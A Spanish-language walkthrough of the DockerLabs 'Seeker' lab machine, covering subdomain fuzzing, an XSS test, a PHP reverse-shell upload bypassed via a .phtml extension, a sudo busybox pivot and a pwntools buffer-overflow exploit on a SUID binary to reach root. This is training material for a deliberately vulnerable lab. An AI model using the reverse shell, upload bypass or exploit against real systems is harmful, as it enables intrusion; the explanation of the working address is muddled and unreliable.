---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Seeker DockerLabs (Intermediate)

Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip seeker.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh seeker.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 11:37 EST
Nmap scan report for insanity.dl (172.17.0.2)
Host is up (0.000041s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
```

Si entramos en la pagina vemos algo normal, pero si nos fijamos en la pagina de `apache2` que viene por defecto en el siguiente campo, vemos algo bastante interesante que no viene por defecto:

```
located at /var/www/5eEk3r/index.html
```

Vemos un nombre llamado `5eEk3r`.

Tras mucha busqueda probamos a utilizarlo como `dominio` de la siguiente forma:

```
5eEk3r.dl (.dl de DockerLabs)
```

Y lo meteremos en nuestro archivo `hosts` de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>          5eEk3r.dl
```

Lo guardamos y ahora entramos mediante ese dominio.

```
URL = http://5eEk3r.dl/
```

Vemos que la pagina sigue siendo la misma, si hacemos `fuzzing`de directorios seguimos sin ver nada, pero cuando tenemos un dominio podremos ver si tiene `subdominios` con el dominio, por lo que haremos lo siguiente.

## FFUF (Subdominio)

```shell
ffuf -c -w <WORDLIST> -u http://5eek3r.dl -H "Host: FUZZ.5eek3r.dl" -fs 10705
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://5eek3r.dl
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.5eek3r.dl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10705
________________________________________________

crosswords              [Status: 200, Size: 934, Words: 180, Lines: 102, Duration: 2ms]
:: Progress: [20469/20469] :: Job [1/1] :: 3389 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

Vemos que tenemos un `subdominio` llamado `crosswords`, por lo que nos meteremos de la siguiente forma a la `URL`.

Pero antes lo meteremos de nuevo en nuestro archivo `hosts` de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>      5eEk3r.dl crosswords.5eek3r.dl
```

Lo guardamos y ahora si lo buscamos.

```
URL = http://crosswords.5eek3r.dl/
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (173) (1).png" alt=""><figcaption></figcaption></figure>

Si inspeccionamos la pagina y bajamos abajo del todo veremos lo siguiente:

```html
<!-- Al que contratamos para crear la web nos habló de algo llamado 'xss'... que será? -->
```

Vemos que nos esta hablando de que alguna forma se puede hacer `XSS` en la pagina que es una vulnerabilidad web en la que puedes injectar codigo dedicado al `HTML`, `CSS`, `JS`, etc... Y en la que se pueden hacer diversas cosas con la funcion `<script>`, pero tendremos que investigar a ver como realizarlo.

Para ello tendremos que abrir `BurpSuite` ponernos en mitad de la comunicacion entre `Cliente-Servidor` y si capturamos la respuesta del usuario que va a enviar la palabra en este caso esto:

```
<p style='color:red;'>test</p>
```

Para ver si la palabra `test` se pone en rojo, y la enviamos con `BurpSuite` veremos que no pasa nada, pero si vemos a nivel de codigo lo que esta pasando, vemos lo siguiente:

```html
<d ghmzs='qczcf:fsr;'>hsgh</d>
```

Vemos que se esta codificando por lo que vamos activar una opcion en `BurpSuite` para que tambien podamos obtener la respuesta del `servidor` y asi modificar a tiempo real la respuesta para que cuando se envie se ejecute.

Modificaremos en `BurpSuite` esto:

<figure><img src="../../.gitbook/assets/image (174) (1).png" alt=""><figcaption></figcaption></figure>

Marcaremos esa `casilla`.

Ahora volveremos a capturar la respuesta con la misma frase:

```
<p style='color:red;'>test</p>
```

Una vez capturado le daremos una vez al boton llamado `Forward` y nos llegara la respuesta del servidor, en la parte de `Response` identificaremos la fraccion del codigo que ya esta codificada:

<figure><img src="../../.gitbook/assets/image (175) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (176) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que es esa de ahi, por lo que la dejaremos de la siguiente forma:

<figure><img src="../../.gitbook/assets/image (177) (1).png" alt=""><figcaption></figcaption></figure>

Ahora lo enviaremos y veremos lo siguiente en la pagina:

<figure><img src="../../.gitbook/assets/image (178) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que nos ha funcionado, por lo que ya sabremos como realizar un `XSS` en la pagina, pero si seguimos investigando sera inutil la busqueda, vamos a probar ha realizar `fuzzing`:

## Gobuster

```shell
gobuster dir -u http://crosswords.5eek3r.dl/ -w ../../Downloads/directory-list-2.3-big.txt -x html,php,txt -t 100 -k 
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crosswords.5eek3r.dl/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                ../../Downloads/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 934]
/.php                 (Status: 403) [Size: 285]
/javascript           (Status: 301) [Size: 333] [--> http://crosswords.5eek3r.dl/javascript/]
/.html                (Status: 403) [Size: 285]
/.php                 (Status: 403) [Size: 285]
/.html                (Status: 403) [Size: 285]
/server-status        (Status: 403) [Size: 285]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 285]
/converts.txt         (Status: 200) [Size: 0]
Progress: 5095328 / 5095332 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que nos saca un archivo `.txt` bastante interesante llamado `/converts.txt`, si nos metemos dentro no veremos absolutamente nada por lo que no nos sirve de mucho.

Vamos a seguir realizando mas `fuzzing` pero esta vez para ver si hay otro `subdominio` en la pagina.

## FFUF (segundo subdominio)

```shell
ffuf -c -w <WORDLIST> -u http://crosswords.5eek3r.dl -H "Host: FUZZ.crosswords.5eek3r.dl" -fs 10705
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://crosswords.5eek3r.dl
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.crosswords.5eek3r.dl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10705
________________________________________________

ADMIN                   [Status: 200, Size: 2906, Words: 1318, Lines: 104, Duration: 1ms]
Admin                   [Status: 200, Size: 2906, Words: 1318, Lines: 104, Duration: 1ms]
admin                   [Status: 200, Size: 2906, Words: 1318, Lines: 104, Duration: 1ms]
:: Progress: [20469/20469] :: Job [1/1] :: 3225 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Vemos que nos aparecen `3`opciones, pero todas parecen ser las mismas, por lo que elegire el llamado `admin`.

Vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>          5eek3r.dl crosswords.5eek3r.dl admin.crosswords.5eek3r.dl
```

Lo guardamos e ingresaremos en dicho dominio.

```
URL = http://admin.crosswords.5eek3r.dl/
```

Vemos lo siguiente:

<figure><img src="../../.gitbook/assets/image (179) (1).png" alt=""><figcaption></figcaption></figure>

## Escalate user www-data

Vemos que parece que nos deja subir un archivo en el propio directorio de donde esta la pagina web subida, por lo que intentaremos subir un archivo `.php` para crearnos una `reverse shell`.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora le daremos a `Subir...` y seleccionaremos nuestro archivo `shell.php`, pero si lo intentamos nos pondra lo siguiente:

```
No se permiten archivos PHP, solo HTML.
```

Por lo que haremos un `Bypass` con la extension de `PHP`, para mas informacion me fui a esta pagina:

URL = [Info Bypass Extensions](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)

Moveremos nuestro archivo `shell.php` a una extension llamada `phtml` de la siguiente forma:

```shell
mv shell.php shell.phtml
```

Y ahora lo volveremos a subir y veremos el siguiente mensaje:

```
Archivo subido con éxito: shell.phtml
```

Por lo que nos iremos a la siguiente `URL` de esta forma:

Pero antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y ahora si ingresaremos en la siguiente ruta de `URL`:

```
URL = http://crosswords.5eek3r.dl/shell.phtml
```

Y si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 50190
whoami
www-data
```

Vemos que somos el usuario `www-data` por lo que sanitizaremos la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user astu

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on dockerlabs:
    (astu : astu) NOPASSWD: /usr/bin/busybox
```

Vemos que podemos ejecutar el binario `busybox` como el usuario `astu`, por lo que haremos lo siguiente:

```shell
sudo -u astu busybox sh
bash
```

Y con esto ya seremos dicho usuario.

## Escalation Privileges

Si listamos los permisos `SUID` que tenemos con este usuario veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2104987     16 -r-sr-xr-x   1 root     root        15776 Jan 20 01:06 /home/astu/secure/bs64
  2124017   1384 -rwsr-xr-x   1 root     root      1414168 Sep 28 14:49 /usr/sbin/exim4
  2097632     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
  2097756     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
  2097767     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
  2097819     72 -rwsr-xr-x   1 root     root        72000 Oct 18 12:56 /usr/bin/su
  2097693     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
  2097751     60 -rwsr-xr-x   1 root     root        59704 Oct 18 12:56 /usr/bin/mount
  2097843     36 -rwsr-xr-x   1 root     root        35128 Oct 18 12:56 /usr/bin/umount
  2097626     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
  2105249    276 -rwsr-xr-x   1 root     root       281624 Jun 27  2023 /usr/bin/sudo
```

Vemos uno interesante que es el siguiente:

```
2104987  16 -r-sr-xr-x   1 root  root  15776 Jan 20 01:06 /home/astu/secure/bs64
```

Si probamos a ejecutar el binario veremos lo siguiente:

```shell
cd /home/astu/secure/
./bs64
```

Info:

```
Ingrese el texto: test
dGVdA==
```

Vemos que parece que el texto que ingresamos nos lo codifica en `Base64`, pero si probamos a desbordar la memoria.

```shell
./bs64
```

Info:

```
Ingrese el texto: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUF
Segmentation fault
```

Vemos el `Segmentation fault` por lo que vemos podremos realizar un `Buffer Overflow`.

### Ingenieria inversa "bs64"

Si nos pasamos el binario a nuestro `host` para ver que funciones tiene y ver a ver que hace con la herramienta `ghidra` veremos lo siguiente, pero antes los pasos para pasarnos el bianrio.

> Maquina victima

```shell
python3 -m http.server
```

> Maquina host

```shell
wget http://<IP>:8000/bs64
```

Ahora ejecutaremos la herramienta `ghidra`:

```shell
ghidra
```

Abriremos un nuevo proyecto e importaremos el binario `bs64`, si vemos las funciones que tiene veremos que hay una bastante interesante llamada `fire` que en `C` se veria algo asi:

```c
void fire(void)

{
  printf("Ejecutando /bin/sh");
  setuid(0);
  system("/bin/sh");
  return;
}
```

Por lo que vemos si llama a esta funcion ejecuta un `/bin/sh` como el usuario `root` por el `setuid(0)`, por lo que tendremos que escribir en la memoria que se va a ejecutar esa funcion, para ello tendremos que saber a que direccion de memoria esta esta funcion de la siguiente forma.

Tambien sacaremos el `offset` ya que lo tenemos en nuestro `host` de la siguiente forma, utilizaremos `gdb` con la funcion de `pwndbg`, ya explique en anteriores `writeups` como instalarlo:

Vamos a crear un patron para ingresarlo en el `gdb` del binario.

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
```

Info:

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Ahora haremos lo siguiente:

```shell
pwndbg> r
```

Info:

```
Starting program: /home/kali/Desktop/seeker/bs64 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Ingrese el texto: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
QWEQWEQWEQWEQWEQWEQWEQWEQWEQWEQWIQWIQWIQWIQWIQWIQWIQWIQWIQWIQWMQWMQWMQWMQWMQWMQWMQWMQWMQWMQWQQWQQWQQWQQWQQWQQWQQWQQWQQWQQWUQWUQWUQWUQWUQWUQWUQWUQWUQWUQWYQWYQWYQWYQWYQWYQWYQWYQWYQWYQWcQWcQWcQWcQWcQWcQWcQWcQWcQWcQWgQWgQWgQWgQWgQWgQWgQWgQWgQWgQWkQWkQWkQWkQWkQWkQWkQWkQWkQWkQWoQWoQWoQWoQWoQWoQWoQWoQWoQWoQWsQWsQWsQWsQWsQWsQWsQWsQWsQWsQWwQWwQWwQWwQWwQWwQWwQWwQWwQWwQW0QW0QW0QW0QW0QW0QW0QW0QW0QW0QW4QW4QW4QQ==

Program received signal SIGSEGV, Segmentation fault.
0x00000000004013d8 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 RAX  0
 RBX  0x7fffb1abf4d8 ◂— '4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
 RCX  0x7f3f2d1c8210 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7f3f2d2ad710 (_IO_stdfile_1_lock) ◂— 0
 RSI  0x9322a0 ◂— 0x5751455751455751 ('QWEQWEQW')
 R8   0x63
 R9   0xffffffff
 R10  3
 R11  0x202
 R12  0
 R13  0x7fffb1abf4e8 ◂— 'Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
 R14  0x7f3f2d30c000 (_rtld_global) —▸ 0x7f3f2d30d2e0 ◂— 0
 R15  0x403df0 —▸ 0x401130 ◂— endbr64 
 RBP  0x3363413263413163 ('c1Ac2Ac3')
 RSP  0x7fffb1abf3c8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
 RIP  0x4013d8 (main+58) ◂— ret 
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────
 ► 0x4013d8 <main+58>    ret                                <0x6341356341346341>
    ↓









──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffb1abf3c8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
01:0008│     0x7fffb1abf3d0 ◂— 0x4138634137634136 ('6Ac7Ac8A')
02:0010│     0x7fffb1abf3d8 ◂— 0x3164413064413963 ('c9Ad0Ad1')
03:0018│     0x7fffb1abf3e0 ◂— 0x6441336441326441 ('Ad2Ad3Ad')
04:0020│     0x7fffb1abf3e8 ◂— 0x4136644135644134 ('4Ad5Ad6A')
05:0028│     0x7fffb1abf3f0 ◂— 0x3964413864413764 ('d7Ad8Ad9')
06:0030│     0x7fffb1abf3f8 ◂— 0x6541316541306541 ('Ae0Ae1Ae')
07:0038│     0x7fffb1abf400 ◂— 0x4134654133654132 ('2Ae3Ae4A')
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0         0x4013d8 main+58
   1 0x6341356341346341 None
   2 0x4138634137634136 None
   3 0x3164413064413963 None
   4 0x6441336441326441 None
   5 0x4136644135644134 None
   6 0x3964413864413764 None
   7 0x6541316541306541 None
───────────────────────────────────────────────────────────────────────────────────
```

Vemos que el `ret` esta en `0x6341356341346341` por lo que sacaremos el `offset` con dicha direccion.

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6341356341346341
```

Info:

```
[*] Exact match at offset 72
```

El `offset` vemos que es de `72 bytes`.

### Explotación

> Maquina victima

```shell
objdump -d bs64 | grep fire
```

Info:

```
000000000040136a <fire>:
```

Con esto sabemos que tendremos que rellenar el `EIP` con esa direccion de memoria para que se ejecute el `/bin/sh` que contiene dicha funcion `fire`.

Como esta en `little-endian` tendremos que darle la vuelta de la siguiente forma:

```
\x6a\x13\x40\x00\x00\x00\x00\x00
```

Por lo que tendremos que enviar el siguiente `payload` al binario:

```shell
python3 -c "import sys; sys.stdout.buffer.write(b'A' * 72 + b'\x6a\x13\x40\x00\x00\x00\x00\x00')" | ./bs64
```

Pero nos da un error al intentar rellenar el `EIP` con la funcion `fire`, aunque lo intentemos de forma manual no se por que no va de ninguna manera, sigue dando un error, por lo que probaremos a montarnos un script con el paquete `pwn` para que nos facilite mas la tarea.

***

> NOTA

La forma manual nos puede estar dando un error por el echo de que la direccion puede tener caracteres especiales que no estan siendo escapados correctamente, por lo que a la hora de hacerlo con un script esos caracteres se incluyen de forma correcta, este comando si se ejecutaria bien:

```shell
python3 -c "from pwn import *; p=process('./bs64'); p.sendline(b'A' * 72 + p64(0x40136b)); p.interactive()"
```

Y con esto ya seremos `root`, pero si queremos hacerlo con un script bien echo, seria de la siguiente forma.

***

```shell
cd /tmp
```

> exploit.py

```python
#!/bin/python3

from pwn import *

# Configuración del binario
binary = '/home/astu/secure/bs64'  # Reemplaza con la ruta del binario
context.binary = binary

# Cargar el binario
elf = ELF(binary)
p = process(binary)

# Dirección de la función "fire"
fire_func = 0x40136b  # Dirección de la función fire

# Crear el payload
payload = b"A" * 72  # Relleno hasta el EIP (offset de 72 bytes)
payload += p64(fire_func)  # Dirección de la función "fire"

# Enviar el payload
log.info(f"Enviando payload: {payload}")
p.sendline(payload)

# Mantener la interacción
p.interactive()
```

Una vez creado el script si probamos con la direccion que obtenemos al principio `0x40136a` no nos ira, pero si probamos la siguiente `0x40136b` esta si que funcionara.

### Explicación de la explotación

#### 1. **Dirección de `fire` y el desplazamiento en la pila**

La dirección de la función `fire` en tu binario es `0x40136a`, pero cuando el _exploit_ funciona, usas `0x40136b`. La razón de esta diferencia tiene que ver con cómo las funciones y las direcciones se almacenan en la memoria.

**Explicación técnica:**

* La **dirección de la función** `fire` es `0x40136a`, pero al estar trabajando con un buffer y realizando un _overflow_ de la pila, la dirección de retorno que se sobrescribe no se refiere exactamente a `0x40136a`.
* **Posible causa**: Debido a la forma en que se alinean las instrucciones de la CPU o el compilador optimiza el código, **la instrucción de retorno** (`ret`) de la función `fire` podría estar en un byte diferente al de la dirección `0x40136a`. En lugar de sobrescribir exactamente en `0x40136a`, sobrescribes un byte adicional, que puede estar en `0x40136b`.

Por lo tanto, en lugar de apuntar exactamente a `0x40136a`, se apunta a `0x40136b` y es eso lo que hace que funcione.

***

#### 2. **Por qué no funciona la forma manual**

Cuando intentas realizar el _exploit_ de manera manual (es decir, sin un script), puede que no esté funcionando correctamente por uno o varios de estos motivos:

**A. Dirección en formato little-endian**

Cuando proporcionas la dirección manualmente, asegúrate de que esté en **little-endian**, ya que la arquitectura x86\_64 usa este formato para las direcciones de memoria. El formato little-endian invierte el orden de los bytes de una dirección para que se almacenen en memoria correctamente.

* Si tienes la dirección `0x40136b`, **debería ser invertida** para su uso en la pila:\
  En formato little-endian, `0x40136b` se representaría como `\x6b\x13\x40\x00\x00\x00\x00\x00`.

**B. Error en la cantidad de bytes de relleno (offset)**

El _offset_ que mencionas es de **72 bytes**. Esto significa que debes escribir **72 bytes** de relleno antes de colocar la dirección que sobrescribe la dirección de retorno.\
Asegúrate de que estés escribiendo exactamente 72 caracteres de relleno (`'A' * 72`) antes de colocar la dirección de `fire`. Si no lo haces correctamente, el puntero de retorno puede estar apuntando a un lugar incorrecto.

**C. Problemas con el entorno de ejecución**

Cuando lo haces manualmente, puede que el entorno de ejecución (por ejemplo, el terminal o el sistema operativo) no esté interpretando correctamente los datos que estás enviando. Si hay espacios en blanco u otros caracteres que pueden ser malinterpretados, eso puede hacer que la ejecución no funcione.

Por ejemplo, asegúrate de que no haya caracteres de nueva línea () o terminadores de cadena al final de la entrada que interfieran con la ejecución.

***

#### 3. **¿Por qué sí funciona con el script?**

Cuando usas un script, todo el proceso es manejado de manera más controlada:

* **El script asegura que la dirección esté en el formato correcto** (little-endian y con la cantidad correcta de bytes).
* **El script maneja el flujo de entrada de manera consistente**, asegurándose de que no haya caracteres extraños que interfieran.

### Ejecución del exploit

Ahora lo ejecutaremos de la siguiente forma:

```shell
python3 exploit.py
```

Info:

```
[*] '/home/astu/secure/bs64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/astu/secure/bs64': pid 163
[*] Enviando payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAk\x13@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
Ingrese el texto: QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFaxN
$ whoami
root
```

Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
